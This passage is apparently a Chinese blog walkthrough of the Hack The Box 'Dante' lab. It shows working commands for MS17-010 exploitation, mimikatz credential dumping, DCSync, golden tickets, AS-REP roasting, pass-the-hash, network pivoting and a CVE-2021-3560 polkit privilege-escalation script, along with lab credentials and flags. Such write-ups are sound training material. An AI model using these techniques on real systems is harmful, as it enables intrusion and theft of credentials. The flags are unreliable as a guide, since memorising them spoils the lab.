$cb&gt;\n&quot;; &#125;</span><br><span class="line">		print &quot;&lt;td valign=top align=center width=$per\%&gt;\n&quot;;</span><br><span class="line">		local $idx = $m-&gt;&#123;&#x27;index_link&#x27;&#125;;</span><br><span class="line">		print &quot;&lt;table border&gt;&lt;tr&gt;&lt;td&gt;&lt;a href=$gconfig&#123;&#x27;webprefix&#x27;&#125;/$m-&gt;&#123;&#x27;dir&#x27;&#125;/$idx&gt;&quot;,</span><br><span class="line">		      &quot;&lt;img src=$m-&gt;&#123;&#x27;dir&#x27;&#125;/images/icon.gif border=0 &quot;,</span><br><span class="line">		      &quot;width=48 height=48&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n&quot;;</span><br><span class="line">		print &quot;&lt;a href=$gconfig&#123;&#x27;webprefix&#x27;&#125;/$m-&gt;&#123;&#x27;dir&#x27;&#125;/$idx&gt;$m-&gt;&#123;&#x27;desc&#x27;&#125;&lt;/a&gt;&lt;/td&gt;\n&quot;;</span><br><span class="line">		if ($pos % $cols == $cols - 1) &#123; print &quot;&lt;/tr&gt;\n&quot;; &#125;</span><br><span class="line">		$pos++;</span><br><span class="line">		&#125;</span><br><span class="line">	print &quot;&lt;/table&gt;&lt;/center&gt;&lt;p&gt;&lt;hr id=&#x27;mods_hr&#x27;&gt;\n&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">else &#123;</span><br><span class="line">	# Display under categorised tabs</span><br><span class="line">	&amp;ReadParse();</span><br><span class="line">	%cats = &amp;list_categories(\@modules);</span><br><span class="line">	@cats = sort &#123; $b cmp $a &#125; keys %cats;</span><br><span class="line">	$cats = @cats;</span><br><span class="line">	$per = $cats ? 100.0 / $cats : 100;</span><br><span class="line">	if (!defined($in&#123;&#x27;cat&#x27;&#125;)) &#123;</span><br><span class="line">		# Use default category</span><br><span class="line">		if (defined($gconfig&#123;&#x27;deftab&#x27;&#125;) &amp;&amp;</span><br><span class="line">		    &amp;indexof($gconfig&#123;&#x27;deftab&#x27;&#125;, @cats) &gt;= 0) &#123;</span><br><span class="line">			$in&#123;&#x27;cat&#x27;&#125; = $gconfig&#123;&#x27;deftab&#x27;&#125;;</span><br><span class="line">			&#125;</span><br><span class="line">		else &#123;</span><br><span class="line">			$in&#123;&#x27;cat&#x27;&#125; = $cats[0];</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	elsif (!$cats&#123;$in&#123;&#x27;cat&#x27;&#125;&#125;) &#123;</span><br><span class="line">		$in&#123;&#x27;cat&#x27;&#125; = &quot;&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">	print &quot;&lt;table id=&#x27;cattabs&#x27; border=0 cellpadding=0 cellspacing=0 height=20&gt;&lt;tr&gt;\n&quot;;</span><br><span class="line">	$usercol = defined($gconfig&#123;&#x27;cs_header&#x27;&#125;) ||</span><br><span class="line">		   defined($gconfig&#123;&#x27;cs_table&#x27;&#125;) ||</span><br><span class="line">		   defined($gconfig&#123;&#x27;cs_page&#x27;&#125;);</span><br><span class="line">	foreach $c (@cats) &#123;</span><br><span class="line">		$t = $cats&#123;$c&#125;;</span><br><span class="line">		if ($in&#123;&#x27;cat&#x27;&#125; eq $c) &#123;</span><br><span class="line">			print &quot;&lt;td class=&#x27;usercoll&#x27; valign=top $cb&gt;&quot;, $usercol ? &quot;&lt;br&gt;&quot; :</span><br><span class="line">			  &quot;&lt;img src=images/lc2.gif alt=\&quot;\&quot;&gt;&quot;,&quot;&lt;/td&gt;\n&quot;;</span><br><span class="line">			print &quot;&lt;td class=&#x27;usercolc&#x27; id=&#x27;selectedcat&#x27; $cb&gt;&amp;nbsp;&lt;b&gt;$t&lt;/b&gt;&amp;nbsp;&lt;/td&gt;\n&quot;;</span><br><span class="line">			print &quot;&lt;td class=&#x27;usercolr&#x27; valign=top $cb&gt;&quot;, $usercol ? &quot;&lt;br&gt;&quot; :</span><br><span class="line">			  &quot;&lt;img src=images/rc2.gif alt=\&quot;\&quot;&gt;&quot;,&quot;&lt;/td&gt;\n&quot;;</span><br><span class="line">			&#125;</span><br><span class="line">		else &#123;</span><br><span class="line">			print &quot;&lt;td class=&#x27;usercoll&#x27; valign=top $tb&gt;&quot;, $usercol ? &quot;&lt;br&gt;&quot; :</span><br><span class="line">			  &quot;&lt;img src=images/lc1.gif alt=\&quot;\&quot;&gt;&quot;,&quot;&lt;/td&gt;\n&quot;;</span><br><span class="line">			print &quot;&lt;td class=&#x27;usercolc&#x27; $tb&gt;&amp;nbsp;&quot;,</span><br><span class="line">			      &quot;&lt;a href=$gconfig&#123;&#x27;webprefix&#x27;&#125;/?cat=$c&gt;&lt;b&gt;$t&lt;/b&gt;&lt;/a&gt;&amp;nbsp;&lt;/td&gt;\n&quot;;</span><br><span class="line">			print &quot;&lt;td class=&#x27;usercolr&#x27; valign=top $tb&gt;&quot;, $usercol ? &quot;&lt;br&gt;&quot; :</span><br><span class="line">			  &quot;&lt;img src=images/rc1.gif alt=\&quot;\&quot;&gt;&quot;,&quot;&lt;/td&gt;\n&quot;;</span><br><span class="line">			&#125;</span><br><span class="line">		print &quot;&lt;td width=10&gt;&lt;/td&gt;\n&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">	print &quot;&lt;/tr&gt;&lt;/table&gt; &lt;table id=&#x27;mods&#x27; border=0 cellpadding=0 cellspacing=0 &quot;,</span><br><span class="line">              &quot;width=100% $cb&gt;\n&quot;;</span><br><span class="line">	print &quot;&lt;tr&gt;&lt;td&gt;&lt;table width=100% cellpadding=5&gt;\n&quot;;</span><br><span class="line"></span><br><span class="line">	# Display the modules in this category</span><br><span class="line">	$pos = 0;</span><br><span class="line">	$cols = $gconfig&#123;&#x27;nocols&#x27;&#125; ? $gconfig&#123;&#x27;nocols&#x27;&#125; : 4;</span><br><span class="line">	$per = 100.0 / $cols;</span><br><span class="line">	foreach $m (@modules) &#123;</span><br><span class="line">		next if ($m-&gt;&#123;&#x27;category&#x27;&#125; ne $in&#123;&#x27;cat&#x27;&#125;);</span><br><span class="line"></span><br><span class="line">		if ($pos % $cols == 0) &#123; print &quot;&lt;tr&gt;\n&quot;; &#125;</span><br><span class="line">		local $idx = $m-&gt;&#123;&#x27;index_link&#x27;&#125;;</span><br><span class="line">		print &quot;&lt;td valign=top align=center width=$per\%&gt;\n&quot;;</span><br><span class="line">		print &quot;&lt;table border bgcolor=#ffffff&gt;&lt;tr&gt;&lt;td&gt;&lt;a href=$gconfig&#123;&#x27;webprefix&#x27;&#125;/$m-&gt;&#123;&#x27;dir&#x27;&#125;/$idx&gt;&quot;,</span><br><span class="line">		      &quot;&lt;img src=$m-&gt;&#123;&#x27;dir&#x27;&#125;/images/icon.gif alt=\&quot;\&quot; border=0&gt;&lt;/a&gt;&quot;,</span><br><span class="line">		      &quot;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n&quot;;</span><br><span class="line">		print &quot;&lt;a href=$gconfig&#123;&#x27;webprefix&#x27;&#125;/$m-&gt;&#123;&#x27;dir&#x27;&#125;/$idx&gt;$m-&gt;&#123;&#x27;desc&#x27;&#125;&lt;/a&gt;&lt;/td&gt;\n&quot;;</span><br><span class="line">		if ($pos++ % $cols == $cols - 1) &#123; print &quot;&lt;/tr&gt;\n&quot;; &#125;</span><br><span class="line">		&#125;</span><br><span class="line">	while($pos++ % $cols) &#123;</span><br><span class="line">		print &quot;&lt;td width=$per\%&gt;&lt;/td&gt;\n&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">	print &quot;&lt;/table&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;p&gt;&lt;hr id=&#x27;mods_hr&#x27;&gt;\n&quot;;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"># Check for incorrect OS</span><br><span class="line">if (&amp;foreign_check(&quot;webmin&quot;)) &#123;</span><br><span class="line">	&amp;foreign_require(&quot;webmin&quot;, &quot;webmin-lib.pl&quot;);</span><br><span class="line">	&amp;webmin::show_webmin_notifications();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">if ($miniserv&#123;&#x27;logout&#x27;&#125; &amp;&amp;</span><br><span class="line">    !$ENV&#123;&#x27;SSL_USER&#x27;&#125; &amp;&amp; !$ENV&#123;&#x27;LOCAL_USER&#x27;&#125; &amp;&amp; !$ENV&#123;&#x27;ANONYMOUS_USER&#x27;&#125; &amp;&amp;</span><br><span class="line">    $ENV&#123;&#x27;HTTP_USER_AGENT&#x27;&#125; !~ /webmin/i) &#123;</span><br><span class="line">	print &quot;&lt;table id=&#x27;altlogout&#x27; width=100% cellpadding=0 cellspacing=0&gt;&lt;tr&gt;\n&quot;;</span><br><span class="line">	if ($main::session_id) &#123;</span><br><span class="line">		print &quot;&lt;td align=right&gt;&lt;a href=&#x27;session_login.cgi?logout=1&#x27;&gt;&quot;,</span><br><span class="line">		      &quot;$text&#123;&#x27;main_logout&#x27;&#125;&lt;/a&gt;&lt;/td&gt;\n&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">	else &#123;</span><br><span class="line">		print &quot;&lt;td align=right&gt;&lt;a href=switch_user.cgi&gt;&quot;,</span><br><span class="line">		      &quot;$text&#123;&#x27;main_switch&#x27;&#125;&lt;/a&gt;&lt;/td&gt;\n&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">	print &quot;&lt;/tr&gt;&lt;/table&gt;\n&quot;;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">print $text&#123;&#x27;main_footer&#x27;&#125;;</span><br><span class="line">&amp;footer();</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-023.png?x-oss-process=image/format,webp"></p>
+<p>之前wireshack找到一个<a target="_blank" rel="noopener" href="http://172.16.1.17:10000/">http://172.16.1.17:10000/</a>  的密码，登录</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-051.png"></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-052.png"> </p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-053.png"></p>
+<p>flag6：DANTE{SH4RKS_4R3_3V3RYWHERE}</p>
+<h2 id="Windows-DC01-域控-172-16-1-20"><a href="#Windows-DC01-域控-172-16-1-20" class="headerlink" title="Windows DC01 域控 :172.16.1.20"></a>Windows DC01 域控 :172.16.1.20</h2><p>fscan ：<font style="color:rgb(15, 17, 21);">发现漏洞 172.16.1.20 MS17-010</font></p>
+<p><font style="color:rgb(15, 17, 21);">因为代理，所以 bind_tcp 正向 payload  </font></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_psexec</span><br><span class="line">set RHOSTS 172.16.1.20</span><br><span class="line">set RPORT 445</span><br><span class="line">set PAYLOAD windows/meterpreter/bind_tcp</span><br><span class="line">set LPORT 4444</span><br><span class="line">set Proxies socks5:127.0.0.1:1080</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">shell</span><br></pre></td></tr></table></figure>
+
+<p>拿下DC01</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-054.png"></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-055.png"></p>
+<p>flag6:DANTE{Feel1ng_Blu3_or_Zer0_f33lings?}</p>
+<p>下载employee_backup.xlsx</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-056.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">用户名	  密码</span><br><span class="line">asmith	Princess1</span><br><span class="line">smoggat	Summer2019</span><br><span class="line">tmodle	P45678!</span><br><span class="line">ccraven	Password1</span><br><span class="line">kploty	Teacher65</span><br><span class="line">jbercov	4567Holiday1</span><br><span class="line">whaguey	acb123</span><br><span class="line">dcamtan	WorldOfWarcraft67</span><br><span class="line">tspadly	RopeBlackfieldForwardslash</span><br><span class="line">ematlis	JuneJuly1TY</span><br><span class="line">fglacdon	FinalFantasy7</span><br><span class="line">tmentrso	65RedBalloons</span><br><span class="line">dharding	WestminsterOrange5</span><br><span class="line">smillar	MarksAndSparks91</span><br><span class="line">bjohnston	Bullingdon1</span><br><span class="line">iahmed	Sheffield23</span><br><span class="line">plongbottom	PowerfixSaturdayClub777</span><br><span class="line">jcarrot	Tanenbaum0001</span><br><span class="line">lgesley	SuperStrongCantForget123456789</span><br></pre></td></tr></table></figure>
+
+<p>查看本地用户</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-057.png"></p>
+<p><font style="background-color:#FBDE28;">用户注释</font></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-058.png"></p>
+<p>mrb3n : S3kur1ty2020!</p>
+<p>flag7:DANTE{1_jusT_c@nt_st0p_d0ing_th1s}</p>
+<p>fscan 扫2段</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-059.png"></p>
+<p>发现二级域控172.16.2.5 DANTE-DC02</p>
+<h2 id="Windows-DC02-172-16-2-5"><a href="#Windows-DC02-172-16-2-5" class="headerlink" title="Windows DC02:172.16.2.5"></a>Windows DC02:172.16.2.5</h2><p>拿 域管 NTLM hash  </p>
+<p> 直接用 meterpreter 的 kiwi 模块抓  <font style="background-color:#FBDE28;"></font></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">load kiwi</span><br><span class="line">creds_all</span><br><span class="line">lsa_dump_sam</span><br><span class="line">lsa_dump_secrets</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>本地 Administrator NTLM</strong>：<code>9bff06fe611486579fb74037890fda96</code></li>
+<li><strong>DefaultPassword</strong>：<code>DishonestSupermanDiablo5679</code></li>
+<li><strong>域名</strong>：<code>DANTE.local</code></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kiwi_cmd lsadump::dcsync /domain:DANTE.local /user:krbtgt</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>krbtgt NTLM</strong>：<code>49e6f37ede481d09747f6a0c9abcbaa7</code></li>
+<li><strong>域 SID</strong>：<code>S-1-5-21-2273245918-2602599687-2649756301</code></li>
+</ul>
+<p>黄金票据：</p>
+<p>生成黄金票据并注入内存</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kiwi_cmd kerberos::golden /user:Administrator /domain:DANTE.local /sid:S-1-5-21-2273245918-2602599687-2649756301 /krbtgt:49e6f37ede481d09747f6a0c9abcbaa7 /ptt</span><br></pre></td></tr></table></figure>
+
+<p>不行</p>
+<p>之前的代理是挂在入口机上，现在在DC01上挂一个代理</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Kali → 1080(socks入口) → 入口机 → 172.16.1.0/24 → DC01 → 172.16.2.0/24</span><br></pre></td></tr></table></figure>
+
+<p>利用msf的多级代理：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">sessions -l</span><br><span class="line"># 1. 进 DC01 的 session 加路由</span><br><span class="line">sessions -i &lt;DC01的sessionID&gt;</span><br><span class="line">run autoroute -s 172.16.2.0/24</span><br><span class="line">background</span><br><span class="line"></span><br><span class="line"># 2. 起 socks 代理</span><br><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">set SRVPORT 1081</span><br><span class="line">run -j</span><br><span class="line"></span><br><span class="line"># 3. proxychains 配置加 1081</span><br><span class="line"># /etc/proxychains4.conf 最后一行改成 socks5 127.0.0.1 1081</span><br><span class="line"></span><br><span class="line"># 4. 直接扫</span><br><span class="line">proxychains nmap -sT -Pn 172.16.2.5 -p 21,22,80,88,135,139,389,443,445,5985,3389</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-060.png"></p>
+<p>** **现在要横道DC02上，但是没有对的用户名和密码</p>
+<p><strong><font style="background-color:#FBDE28;">Kerbrute 枚举有效域用户</font></strong>**  **</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-061.png"></p>
+<p>域名DANTE.ADMIN（所以之前的黄金票据不对）</p>
+<p>用已知用用户名密码哈希碰撞</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains impacket-GetNPUsers DANTE.ADMIN/ -dc-ip 172.16.2.5 -usersfile users.txt -format hashcat -outputfile asrep.hash</span><br></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-062.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$krb5asrep$23$jbercov@DANTE.ADMIN:96b2deaa8922c816b32a9b6cd1ca6c86$a8d65b6eb5543f9be68a7a652d30ac5f398c58920c22ab0048a4b9462a26d11fb8e021d36b5f77e6080576542d9b73f626de6c716bc761e3cba7f7600860e522d58ea8a5252dbc7eae0dfd2608bd35a5fc85e060b2fdf2f6121812e9fd3e4ad12cce0083bfd2a5471a7589807d67a6c5c6c26f1b913ac3b628353e6eda1705d53e16a1350c8f15fe94fa44945a76aad0bb12919e1eb753507d62c6ab3fed4c0ed315e5649e89f8573815e3d09ac599d4a7006f490c8298aca99b64b837b0c952a58bd1948277fa2df8dd7c9c0a32a25e98b9b800c53eec56ac224c75db4a2263485668f1f94453473754</span><br></pre></td></tr></table></figure>
+
+<p>爆破哈希：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<p>jbercov ： myspace7  </p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-063.png"></p>
+<p>用 WinRM 登录 DC02</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains evil-winrm -i 172.16.2.5 -u jbercov -p myspace7</span><br></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-064.png"></p>
+<p>但是，msf的代理很不稳定，老是断</p>
+<p>重挂一个frp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Kali(frps服务端) ← DC01(frpc客户端) ← 二级网段 172.16.2.0/24</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 127.0.0.1 -P 5985 -u jbercov -p myspace7</span><br></pre></td></tr></table></figure>
+
+<p>type C:\Users\jbercov\Desktop\flag.txt</p>
+<p>flag8:DANTE{Im_too_hot_Im_K3rb3r045TinG!}</p>
+<p>提权</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-065.png"></p>
+<p>没找到什么有用信息</p>
+<p>fscan：</p>
+<p>还有一台172.16.2.101</p>
+<p>SharpHound看拓扑：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-066.png"></p>
+<p>符合 DCSync 权限  ：****</p>
+<ul>
+<li><code>GetChanges</code></li>
+<li><code>GetChangesInFilteredSet</code></li>
+<li><code>GetChangesAll</code></li>
+</ul>
+<p><strong>说明：</strong></p>
+<p>jbercov 这个账号可以：</p>
+<ul>
+<li>假装自己是域控</li>
+<li>向真域控请求复制所有用户的密码哈希</li>
+<li>不用登录域控，不用提权，直接 dump 整个域的所有账号密码</li>
+</ul>
+<p>找了一个利用工具 DSInternals.psd1  ，试试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">上传完整的 zip</span><br><span class="line">upload /home/echoin/桌面/DSInternals_v7.1.zip</span><br><span class="line">解压</span><br><span class="line">Expand-Archive -Path .\DSInternals_v7.1.zip -DestinationPath .\DSInternals -Force</span><br><span class="line">进到目录里导入</span><br><span class="line">cd .\DSInternals</span><br><span class="line">dir</span><br><span class="line">Import-Module .\DSInternals.psd1</span><br><span class="line">导入成功后直接 dump 哈希</span><br><span class="line">Get-ADReplAccount -SamAccountName Administrator -Server 127.0.0.1 -NamingContext &quot;DC=DANTE,DC=ADMIN&quot;</span><br></pre></td></tr></table></figure>
+
+<p>不行，卡最后一步了</p>
+<p>mimikaze：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\mimikatz.exe &quot;lsadump::dcsync /domain:DANTE.ADMIN /user:Administrator&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>Administrator NTLM</strong>: <code>4c827b7074e99eefd49d05872185f7f8</code></li>
+<li><strong>域 SID</strong>: <code>S-1-5-21-1107894465-4119991344-1603665553</code></li>
+</ul>
+<p>拿到hash了，用哈希登录</p>
+<p>直接用 <strong>evil-winrm PTH 登录</strong></p>
+<p>5985 端口 frp 已经转发到本地 5985 了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 127.0.0.1 -P 5985 -u Administrator -H 4c827b7074e99eefd49d05872185f7f8</span><br></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-067.png"></p>
+<p>flag9：DANTE{DC_or_Marvel?}</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-068.png"></p>
+<blockquote>
+<p>Note：</p>
+<p>你本应通过枚举 DC01 上的浏览器历史文件来发现这个子网。</p>
+<p>172.16.1.10（NIX02）也可以作为跳板打到这台机子，它可能比 DC01 更稳定一些。</p>
+<p>（确实）</p>
+</blockquote>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-069.png"></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-070.png"></p>
+<p>Jenkins.bat文件发现一组用户名密码： Admin_129834765 SamsungOctober102030</p>
+<h2 id="Linux-172-16-2-101"><a href="#Linux-172-16-2-101" class="headerlink" title="Linux:172.16.2.101"></a><font style="color:#DF2A3F;">Linux:172.16.2.101</font></h2><p>有22端口</p>
+<p><font style="color:rgb(42, 42, 42);">SSH 爆破   </font><font style="color:rgb(52, 52, 60);">msf</font></p>
+<p><font style="color:#DF2A3F;background-color:#FBDE28;">julian:manchesterunited（找半天都不知道是哪来的，看wp后来才知道是之前拿的员工表有问题）</font></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-071.png"></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-072.png"></p>
+<p>&#x2F;home&#x2F;julian&#x2F;flag.txt：</p>
+<p>flag10：DANTE{H1ding_1n_th3_c0rner}</p>
+<p><font style="color:rgb(52, 52, 60);">linPEAS :CVE-2021-3560 (Polkit)</font></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"># 1. 创建sudo组用户privesc（利用CVE-2021-3560 polkit竞态条件）</span><br><span class="line"># int32:1 = administrator类型 → 自动加入sudo组</span><br><span class="line">dbus-send --system --dest=org.freedesktop.Accounts \</span><br><span class="line">  --type=method_call --print-reply \</span><br><span class="line">  /org/freedesktop/Accounts \</span><br><span class="line">  org.freedesktop.Accounts.CreateUser \</span><br><span class="line">  string:privesc string:&quot;PrivEsc User&quot; int32:1 &amp;</span><br><span class="line">sleep 0.005</span><br><span class="line">kill $! 2&gt;/dev/null</span><br><span class="line"># 验证创建成功</span><br><span class="line">id privesc</span><br><span class="line"># uid=1000(privesc) gid=1000(privesc) groups=1000(privesc),27(sudo)</span><br><span class="line"># 2. 通过CVE-2021-3560设空密码</span><br><span class="line">python3 -c &quot;</span><br><span class="line">import subprocess, time, os</span><br><span class="line">for i in range(50):</span><br><span class="line">    p = subprocess.Popen([&#x27;dbus-send&#x27;,&#x27;--system&#x27;,&#x27;--dest=org.freedesktop.Accounts&#x27;,</span><br><span class="line">        &#x27;--type=method_call&#x27;,&#x27;--print-reply&#x27;,</span><br><span class="line">        &#x27;/org/freedesktop/Accounts/User1000&#x27;,</span><br><span class="line">        &#x27;org.freedesktop.Accounts.User.SetPassword&#x27;,</span><br><span class="line">        &#x27;string:&#x27;,&#x27;string:&#x27;],</span><br><span class="line">        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)</span><br><span class="line">    time.sleep(0.003)</span><br><span class="line">    try: os.kill(p.pid, 9)</span><br><span class="line">    except: pass</span><br><span class="line">&quot;</span><br><span class="line"># 3. 无密码切换 + sudo提root</span><br><span class="line">su privesc       # 直接回车</span><br><span class="line">sudo su          # root</span><br></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-073.png"></p>
+<p>flag11：DANTE{0verfl0wing_l1k3_craz33!}</p>
+<p><font style="color:rgb(52, 52, 60);">上个fscan,扫一下2段</font></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">root@DANTE-ADMIN-NIX05:~# ./fscan -h 172.16.2.0/24</span><br><span class="line">┌──────────────────────────────────────────────┐</span><br><span class="line">│    ___                              _        │</span><br><span class="line">│   / _ \     ___  ___ _ __ __ _  ___| | __    │</span><br><span class="line">│  / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /    │</span><br><span class="line">│ / /_\\_____\__ \ (__| | | (_| | (__|   &lt;     │</span><br><span class="line">│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │</span><br><span class="line">└──────────────────────────────────────────────┘</span><br><span class="line">      Fscan Version: 2.0.1     </span><br><span class="line">[2.0s]     已选择服务扫描模式                                           </span><br><span class="line">[2.0s]     开始信息扫描</span><br><span class="line">[2.0s]     CIDR范围: 172.16.2.0-172.16.2.255</span><br><span class="line">[2.0s]     generate_ip_range_full</span><br><span class="line">[2.0s]     解析CIDR 172.16.2.0/24 -&gt; IP范围 172.16.2.0-172.16.2.255</span><br><span class="line">[2.0s]     最终有效主机数量: 256</span><br><span 